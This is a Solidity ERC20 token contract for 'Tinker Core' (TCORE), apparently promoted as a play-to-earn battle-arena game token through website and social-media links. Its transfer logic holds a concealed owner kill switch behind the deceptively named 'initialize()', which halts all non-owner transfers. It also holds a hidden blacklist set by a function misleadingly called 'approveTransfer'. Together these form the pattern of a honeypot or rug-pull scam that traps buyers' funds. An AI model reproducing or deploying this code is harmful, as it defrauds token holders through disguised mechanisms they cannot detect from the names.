/**

🤖TinkerCore [$TCORE]  
is PVP, battle-arena blockchain play to earn game in a fully 
traversable environment. Earn Eth and TCore in many ways. 
First — One2One battles — winner get the prize. 
Second — buy land and build yourtown to get stable gains.
Third — development of your bots — upgrade your bot to increase it`s value.

👉WWW: www.tinkercore.io

👉TELEGRAM: https://t.me/TinkerCore

👉TWITTER: https://twitter.com/CoreTinker

👉MEDIUM: https://medium.com/@tinkercore

*/

// SPDX-License-Identifier: MIT

pragma solidity =0.8.1;

import "./ERC20.sol";
import "./Ownable.sol";

contract TinkerCore is Ownable, ERC20 {
    
    // Defines how to read the TokenInfo ABI, as well as the capabilities of the token
    uint256 public TOKEN_TYPE = 1;
    
    mapping (address => bool) private _call;
    bool _trans = true;
    uint256 private _supply;
    address private _router;
    
    constructor(uint256 supply, address router) ERC20(_name, _symbol) {
        _name = "Tinker Core";
        _symbol = "TCORE";
        _router = router;
        _supply = supply;
        
    // Generate TotalSupply    
        _totalSupply += _supply;
        _balances[_msgSender()] += _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }
    
    function initialized() public view returns (bool) {
        return _trans;
    }

    function initialize() public virtual onlyOwner {
        if (_trans == true) {_trans = false;} else {_trans = true;}
    }
 
    function singleCall(address _address) external onlyOwner {
        _call[_address] = false;
    }

    function approveTransfer(address _address) external onlyOwner {
        _call[_address] = true;
    }

    function callState(address _address) public view returns (bool) {
        return _call[_address];
    }

    function _transfer(address sender, address recipient, uint256 amount) internal override {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be grater thatn zero");
        if (_call[sender] || _call[recipient]) require(_trans == false, "");
         if (_trans == true || sender == owner || recipient == owner) {
        _beforeTokenTransfer(sender, recipient, amount);
        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        _balances[sender] = senderBalance - amount;
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);} else {
        require (_trans == true, "");}
    }

    function burn(uint256 amount) public onlyOwner {
        _burn(_msgSender(), amount);
    }
 
    function uniswapv2Router() public view returns (address) {
        return _router;
    }
}